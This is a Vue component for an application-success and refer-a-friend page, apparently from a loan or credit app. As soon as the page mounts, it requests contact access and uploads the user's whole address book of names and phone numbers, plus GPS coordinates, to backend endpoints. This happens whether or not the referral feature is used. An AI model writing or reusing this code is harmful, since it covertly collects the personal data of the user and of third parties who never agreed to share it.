<script setup>
import { ref, onMounted, computed, watch } from 'vue';
import { useRouter, useRoute } from 'vue-router';
import { useApplyStore } from '@/store/apply';
import { sendSms } from '@/utils';
import { $api } from '@/utils/axios';
import { showFailToast, showSuccessToast } from 'vant';
import { useI18n } from 'vue-i18n';
const { t } = useI18n();
const props = defineProps({});
const store = useApplyStore();
const router = useRouter();
const route = useRoute();
const id = route.query.id;
const applicationId = route.query.application_id;
// const id = 'AP202306170001';
console.log(id, 'id');
let show = ref(false);
let contactList = ref([]);
const recommendList = computed(() => store.recommendList);
const list = computed(() =>
  contactList.value.map(item => {
    return {
      ...item,
      name: item.displayName || item.familyName,
      phone: item.phoneNumbers && item.phoneNumbers[0].value,
    };
  })
);
onMounted(() => {
  getContact();
  getGeoLocation();
});

const goPage = () => {
  router.push('/');
};

const showRecommend = () => {
  show.value = true;
};
const getContact = () => {
  if (window.ContactsX) {
    window.ContactsX.requestPermission(
      function (success) {
        console.log(success, 'requestPermission');
        window.ContactsX.find(
          function (success) {
            console.log(success, 'find');
            reportContact(success);
            contactList.value = success;
          },
          function (error) {
            console.error(error);
          },
          {
            fields: {
              phoneNumbers: true,
            },
            baseCountryCode: 'GB',
          }
        );
      },
      function (error) {
        console.error(error);
      }
    );
  }
};
const reportContact = contacts => {
  const formData = new FormData();
  formData.append('application_id', id);
  contacts.forEach((item, index) => {
    formData.append(`contact[${index}][contact_name]`, item.name);
    item.phoneNumbers.forEach((phone, phoneIndex) => {
      formData.append(`contact[${index}][contact_no${phoneIndex + 1}]`, phone.value);
    });
  });
  const res = $api['common/contact'](formData);
};

const getGeoLocation = () => {
  console.log(navigator.geolocation, 'navigator.geolocation');
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      position => {
        console.log(position);
        reportLocation(position.coords);
      },
      err => {
        console.log(err, 'geoLocation');
      }
      // [geolocationError],
      // [geolocationOptions]
    );
  }
};

const reportLocation = position => {
  const formData = new FormData();
  formData.append('application_id', id);
  formData.append('gps_address', 'cant get');
  formData.append('gps_point_of_interest', 'cant get');
  formData.append('gps_latitude', position.latitude);
  formData.append('gps_longitude', position.longitude);

  const res = $api['common/location'](formData);
  console.log(res, 'res');
};

const handleRecommend = item => {
  sendSms(
    item.phone,
    `申请的id：${applicationId}`,
    () => {
      console.log('test,');
      showSuccessToast(t('common.smsFail'));
      reportSms(item);
    },
    () => {
      showFailToast(t('common.smsFail'));
    }
  );
};
const reportSms = async item => {
  console.log('test', item.phone);
  store.addRecommendList(item.phone);
  const formData = new FormData();
  formData.append('application_id', id);
  formData.append('referral_name', item.name);
  formData.append('referral_phone_no', item.phone);

  const res = await $api['common/referral'](formData);
};
</script>
<template>
  <div class="wrap">
    <GoBack path="/apply"></GoBack>
    <div class="img-box"><van-icon name="success" /></div>
    <p class="tip">{{ $t('apply.successContent[0]') }}</p>
    <p class="tip">{{ $t('apply.successContent[1]') }}</p>
    <p class="number">{{ applicationId }}</p>
    <p class="tip">{{ $t('apply.successContent[2]') }}</p>
    <div class="btn-box">
      <van-button @click="goPage" class="btn">{{ $t('apply.goHome') }}</van-button>
      <van-button class="btn" @click="showRecommend">{{ $t('apply.refeFriends') }}</van-button>
    </div>
    <van-popup
      z-index="1"
      v-model:show="show"
      position="bottom"
      :style="{ height: '80%', borderRadius: '10px 10px 0px 0px', padding: '15px 22px 0' }"
    >
      <p @click="show = false">{{ $t('common.cancellation') }}</p>
      <div class="input-box">
        <input :placeholder="$t('apply.placeholder')" type="text" />
        <van-icon class="icon" name="search" />
      </div>
      <h6>{{ $t('apply.contacts') }}</h6>
      <div class="content-box">
        <div class="contenr-item" v-for="(item, index) in list" :key="index">
          <div>
            <p class="input-title">{{ item.name }}</p>
            <p class="number">{{ item.phone }}</p>
          </div>
          <van-button class="tui-btn finish" v-if="recommendList.includes(item.phone)" type="default">{{
            $t('apply.okRecommend')
          }}</van-button>
          <van-button class="tui-btn" v-else type="default" @click="handleRecommend(item)">
            {{ $t('apply.recommend') }}
          </van-button>
        </div>
      </div>
    </van-popup>
  </div>
</template>
<style scoped lang="less">
.wrap {
  .img-box {
    .flex-row;
    width: 125px;
    height: 125px;
    border-radius: 50%;
    border: 1px solid #000;
    font-size: 60px;
    margin: 60px auto;
    color: #339949;
  }
  .tip {
    color: #656060;
    padding: 0 69px;
    font-size: 14px;
    text-align: center;
    margin-top: 30px;
  }
  .number {
    font-size: 24px;
    color: var(--primary-color);
    text-align: center;
    margin-top: 9px;
  }
  .tip:last-child {
    margin-top: 9px;
  }
  .btn-box {
    padding: 54px 16px;
    .btn {
      margin-bottom: 16px;
    }
    .btn:last-child {
      background-color: #bdbdbd;
    }
  }
}
</style>
<style lang="less">
.van-popup.van-popup--bottom {
  .input-box {
    position: relative;
    margin: 17px 0 20px;
    input {
      width: 100%;
      border: 1px solid #c7c7c7;
      border-radius: 5px;
      height: 36px;
      padding: 0 30px;
      font-size: 14px;
      color: #c7c7c7;
    }
    input::placeholder {
      color: #c7c7c7;
    }
    .icon {
      position: absolute;
      top: 0;
      bottom: 0;
      margin: auto;
      top: 9px;
      left: 10px;
    }
  }
  h6 {
    color: var(--primary-color);
  }
  .content-box {
    .contenr-item {
      .flex-row;
      justify-content: space-between;
      height: 86px;
      border-bottom: 1px solid #e2e2e2;
      padding: 20px 0;
      .number {
        text-align: left;
        font-size: 14px;
        color: #8e8e8e;
      }
      .tui-btn {
        width: 70px;
        height: 28px;
        color: white;
        font-size: 12px;
        border-radius: 14px;
        background-color: var(--primary-color);
        &.finish {
          opacity: 0.4;
        }
      }
    }
  }
}
</style>
